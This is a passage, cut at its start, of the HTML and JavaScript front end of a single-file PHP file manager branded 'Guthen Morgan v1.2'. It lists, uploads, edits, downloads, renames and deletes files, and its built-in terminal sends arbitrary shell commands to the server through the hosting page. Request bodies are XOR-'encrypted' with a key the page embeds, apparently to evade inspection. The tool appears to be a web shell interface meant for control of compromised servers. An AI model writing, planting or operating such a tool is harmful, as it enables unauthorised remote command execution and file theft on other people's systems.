                    <button class="btn btn-secondary" @click="modals.delete = false">Cancel</button>
                    <button class="btn btn-danger" @click="confirmDelete()">Delete</button>
                </div>
            </div>
        </div>

        <!-- Hidden file input for uploads -->
        <input type="file" x-ref="fileInput" multiple style="display: none" @change="handleFileUpload($event)">
    </div>

    <script>
        function fileManager() {
            return {
                key: '<?php echo $encryptionKey; ?>',
                currentPath: '<?php echo $currentPath; ?>',
                selfurl: window.location.pathname,
                files: [],
                loading: true,
                os: '<?php echo $os; ?>',

                terminalOpen: false,
                terminalOutput: `
                    <div class="terminal-welcome">
                        <div class="welcome-line">Guthen Morgan v1.2</div>
                        <div class="welcome-line">---</div>
                    </div>
                `,
                terminalCommand: '',
                terminalHistory: [],
                historyIndex: -1,

                modals: {
                    rename: false,
                    edit: false,
                    delete: false,
                    newFile: false
                },

                renameValue: '',
                editContent: '',
                editingFile: null,
                deletingItem: null,
                newfileValue: '',

                get sortedFiles() {
                    return [...this.files].sort((a, b) => {
                        if (a.type === 'folder' && b.type === 'file') return -1;
                        if (a.type === 'file' && b.type === 'folder') return 1;
                        return a.name.localeCompare(b.name);
                    });
                },

                get breadcrumbs() {
                    if (this.currentPath === '/') return [];

                    const parts = this.currentPath.split('/').filter(p => p !== '');
                    let path = '';

                    return parts.map(part => {
                        path += '/' + part;
                        return {
                            name: part,
                            path
                        };
                    });


                },

                get terminalPath() {
                    return this.currentPath === '/' ? '~' : this.currentPath.replace(/^\//, '~/');
                },

                padKey(key, length = 32) {
                    const keyBytes = new TextEncoder().encode(key);
                    const padded = new Uint8Array(length);
                    for (let i = 0; i < Math.min(keyBytes.length, length); i++) {
                        padded[i] = keyBytes[i];
                    }
                    return padded;
                },

                encryptData(plaintext) {
                    try {
                        const keyBytes = this.padKey(this.key);
                        const data = new TextEncoder().encode(plaintext);
                        const encrypted = new Uint8Array(data.length);

                        for (let i = 0; i < data.length; i++) {
                            encrypted[i] = data[i] ^ keyBytes[i % keyBytes.length];
                        }

                        return btoa(String.fromCharCode(...encrypted));
                    } catch (error) {
                        throw new Error('Encryption failed: ' + error.message);
                    }
                },

                async makeEncryptedRequest(data, isFormData = false) {
                    try {
                        if (isFormData) {
                            const response = await fetch(this.selfurl, {
                                method: 'POST',
                                body: data
                            });
                            return await response.json();
                        } else {
                            // Regular JSON requests - encrypt
                            const jsonData = JSON.stringify(data);
                            const encryptedData = await this.encryptData(jsonData);

                            const response = await fetch(this.selfurl, {
                                method: 'POST',
                                headers: {
                                    'Content-Type': 'text/plain'
                                },
                                body: 'ENCRYPTED:' + encryptedData
                            });

                            const responseText = await response.text();

                            return JSON.parse(responseText);
                        }
                    } catch (error) {
                        console.error('Request failed:', error);
                        return {
                            success: false,
                            error: error.message
                        };
                    }
                },

                // Methods
                init() {
                    this.loadFiles();
                },

                async loadFiles() {
                    this.loading = true;
                    try {
                        const response = await fetch(this.selfurl, {
                            method: 'POST',
                            headers: {
                                'Content-Type': 'application/json'
                            },
                            body: JSON.stringify({
                                action: 'list',
                                path: this.currentPath
                            })
                        });

                        const data = await response.json();

                        if (data.success) {
                            this.files = data.files;
                        } else {
                            console.error('Failed to load files:', data.error);
                        }
                    } catch (error) {
                        console.error('Error loading files:', error);
                    } finally {
                        this.loading = false;
                    }
                },

                async navigateTo(path) {

                    if (this.os === 'windows') {
                        if (path.startsWith('/')) {
                            path = path.substring(1);
                        }
                    }

                    this.currentPath = path;
                    await this.loadFiles();
                },

                getFileIcon(file) {
                    if (file.type === 'folder') return 'fas fa-folder';

                    const ext = file.name.split('.').pop().toLowerCase();
                    const iconMap = {
                        'txt': 'fas fa-file-alt',
                        'md': 'fab fa-markdown',
                        'js': 'fab fa-js-square',
                        'css': 'fab fa-css3-alt',
                        'html': 'fab fa-html5',
                        'php': 'fab fa-php',
                        'jpg': 'fas fa-file-image',
                        'jpeg': 'fas fa-file-image',
                        'png': 'fas fa-file-image',
                        'gif': 'fas fa-file-image',
                        'pdf': 'fas fa-file-pdf',
                        'doc': 'fas fa-file-word',
                        'docx': 'fas fa-file-word',
                        'xls': 'fas fa-file-excel',
                        'xlsx': 'fas fa-file-excel',
                        'zip': 'fas fa-file-archive',
                        'rar': 'fas fa-file-archive'
                    };
                    return iconMap[ext] || 'fas fa-file';
                },

                formatPermissions(permissions) {
                    if (!permissions) return '<span style="color: #94a3b8;">-</span>';

                    const createGroup = (label, perms) => {
                        const indicators = ['r', 'w', 'x'].map((perm, index) => {
                            const hasPermission = perms[index] !== '-';
                            const className = hasPermission ? 'granted' : 'denied';
                            return `<div class="permission-indicator ${className}" title="${perm.toUpperCase()}: ${hasPermission ? 'Granted' : 'Denied'}">${hasPermission ? perm.toUpperCase() : '-'}</div>`;
                        }).join('');

                        return `
                            <div class="permission-group">
                                <div class="permission-label">${label}</div>
                                <div class="permission-indicators">${indicators}</div>
                            </div>
                        `;
                    };

                    return `
                        <div class="permissions-display">
                            ${createGroup('Own', permissions.owner)}
                            ${createGroup('Grp', permissions.group)}
                            ${createGroup('Oth', permissions.other)}
                        </div>
                    `;
                },

                // File Operations
                async createFolder() {
                    const name = prompt('Enter folder name:');
                    if (!name) return;

                    try {
                        const data = await this.makeEncryptedRequest({
                            action: 'mkdir',
                            path: this.currentPath,
                            name: name
                        });

                        if (data.success) {
                            await this.loadFiles();
                            this.appendToTerminal(`<div class="command-success">Directory created: ${name}</div>`);
                        } else {
                            alert('Error creating folder: ' + data.error);
                        }
                    } catch (error) {
                        console.error('Error creating folder:', error);
                    }
                },

                uploadFile() {
                    this.$refs.fileInput.click();
                },

                async handleFileUpload(event) {
                    const files = event.target.files;
                    if (!files.length) return;

                    const formData = new FormData();
                    formData.append('action', 'upload');
                    formData.append('path', this.currentPath);

                    for (let i = 0; i < files.length; i++) {
                        formData.append('files[]', files[i]);
                    }

                    try {
                        const data = await this.makeEncryptedRequest(formData, true);
                        if (data.success) {
                            await this.loadFiles();
                            this.appendToTerminal(`<div class="command-success">Files uploaded successfully</div>`);
                        } else {
                            alert('Error uploading files: ' + data.error);
                        }
                    } catch (error) {
                        console.error('Error uploading files:', error);
                    }

                    event.target.value = '';
                },

                async editFile(file) {
                    this.editingFile = file;

                    try {
                        const data = await this.makeEncryptedRequest({
                            action: 'read',
                            path: file.path
                        });

                        if (data.success) {
                            this.editContent = data.content;
                            this.modals.edit = true;
                        } else {
                            alert('Error reading file: ' + data.error);
                        }
                    } catch (error) {
                        console.error('Error reading file:', error);
                    }
                },

                async saveFile() {
                    if (!this.editingFile) return;

                    try {
                        const data = await this.makeEncryptedRequest({
                            action: 'write',
                            path: this.editingFile.path,
                            content: this.editContent
                        });

                        if (data.success) {
                            this.modals.edit = false;
                            this.appendToTerminal(`<div class="command-success">File saved: ${this.editingFile.name}</div>`);
                        } else {
                            alert('Error saving file: ' + data.error);
                        }
                    } catch (error) {
                        console.error('Error saving file:', error);
                    }
                },

                async downloadFile(file) {
                    try {
                        const data = await this.makeEncryptedRequest({
                            action: 'download',
                            path: file.path
                        });
                        if (data.success && data.content) {
                            const link = document.createElement('a');
                            link.href = 'data:application/octet-stream;base64,' + data.content;
                            link.download = file.name;
                            document.body.appendChild(link);
                            link.click();
                            document.body.removeChild(link);
                            this.appendToTerminal(`<div class="command-success">File downloaded: ${file.name}</div>`);
                        } else {
                            alert('Error downloading file: ' + data.error);
                        }
                    } catch (error) {
                        console.error('Error downloading file:', error);
                        return;
                    }
                },

                renameItem(item) {
                    this.deletingItem = item;
                    this.renameValue = item.name;
                    this.modals.rename = true;
                },

                createFile() {
                    this.newfileValue = '';
                    this.modals.newFile = true;
                },

                async confirmRename() {
                    if (!this.deletingItem || !this.renameValue) return;

                    try {
                        const data = await this.makeEncryptedRequest({
                            action: 'rename',
                            oldPath: this.deletingItem.path,
                            newName: this.renameValue
                        });

                        if (data.success) {
                            this.modals.rename = false;
                            await this.loadFiles();
                            this.appendToTerminal(`<div class="command-success">Renamed ${this.deletingItem.name} to ${this.renameValue}</div>`);
                        } else {
                            alert('Error renaming item: ' + data.error);
                        }
                    } catch (error) {
                        console.error('Error renaming item:', error);
                    }
                },

                async confirmCreateFile() {
                    if (!this.newfileValue) return;

                    try {
                        const data = await this.makeEncryptedRequest({
                            action: 'touch',
                            path: this.currentPath,
                            name: this.newfileValue
                        });
                        if (data.success) {
                            this.modals.newFile = false;
                            await this.loadFiles();
                            this.appendToTerminal(`<div class="command-success">File created: ${this.newfileValue}</div>`);
                        } else {
                            alert('Error creating file: ' + data.error);
                        }
                    } catch (error) {
                        console.error('Error creating file:', error);
                    }
                },

                deleteItem(item) {
                    this.deletingItem = item;
                    this.modals.delete = true;
                },

                async confirmDelete() {
                    if (!this.deletingItem) return;

                    try {
                        const data = await this.makeEncryptedRequest({
                            action: 'delete',
                            path: this.deletingItem.path
                        });

                        if (data.success) {
                            this.modals.delete = false;
                            await this.loadFiles();
                            this.appendToTerminal(`<div class="command-success">Deleted: ${this.deletingItem.name}</div>`);
                        } else {
                            alert('Error deleting item: ' + data.error);
                        }
                    } catch (error) {
                        console.error('Error deleting item:', error);
                    }
                },

                // Terminal Functions
                toggleTerminal() {
                    this.terminalOpen = !this.terminalOpen;
                    if (this.terminalOpen) {
                        this.$nextTick(() => {
                            this.$refs.terminalInput.focus();
                        });
                    }
                },

                async executeCommand() {
                    const command = this.terminalCommand.trim();
                    if (!command) return;

                    // Add to history
                    this.terminalHistory.push(command);
                    this.historyIndex = this.terminalHistory.length;

                    // Display command
                    this.appendToTerminal(`<div class="command-line"><span style="color: #10b981;">guthen@morgan</span>:<span style="color: #fbbf24;">${this.terminalPath}</span>$ ${command}</div>`);

                    // Execute command
                    await this.processCommand(command);

                    this.terminalCommand = '';
                    this.scrollTerminalToBottom();
                },

                async processCommand(command) {
                    const parts = command.split(' ');
                    const cmd = parts[0].toLowerCase();
                    const args = parts.slice(1);

                    try {
                        const data = await this.makeEncryptedRequest({
                            action: 'terminal',
                            command: cmd,
                            args: args,
                            path: this.currentPath
                        });

                        if (data.success) {
                            if (data.output) {
                                this.appendToTerminal(data.output);
                            }

                            // Handle special commands
                            if (cmd === 'cd' && data.newPath) {
                                this.currentPath = data.newPath;
                                await this.loadFiles();
                            } else if (['mkdir', 'rmdir', 'rm', 'touch'].includes(cmd)) {
                                await this.loadFiles();
                            } else if (cmd === 'clear') {
                                this.clearTerminal();
                                return;
                            }
                        } else {
                            this.appendToTerminal(`<div class="command-error">${data.error}</div>`);
                        }
                    } catch (error) {
                        console.error('Terminal command error:', error);
                        this.appendToTerminal(`<div class="command-error">Network error: ${error.message}</div>`);
                    }
                },

                clearTerminal() {
                    this.terminalOutput = `
                        <div class="terminal-welcome">
                            <div class="welcome-line">Guthen Morgan v1.2</div>
                            <div class="welcome-line">---</div>
                        </div>
                    `;
                },

                appendToTerminal(html) {
                    this.terminalOutput += html;
                    this.$nextTick(() => this.scrollTerminalToBottom());
                },

                scrollTerminalToBottom() {
                    const output = this.$refs.terminalOutput;
                    if (output) {
                        output.scrollTop = output.scrollHeight;
                    }
                },

                navigateHistory(direction) {
                    if (this.terminalHistory.length === 0) return;

                    this.historyIndex += direction;

                    if (this.historyIndex < 0) {
                        this.historyIndex = 0;
                    } else if (this.historyIndex >= this.terminalHistory.length) {
                        this.historyIndex = this.terminalHistory.length;
                        this.terminalCommand = '';
                        return;
                    }

                    this.terminalCommand = this.terminalHistory[this.historyIndex] || '';
                }
            }
        }
    </script>
</body>

</html>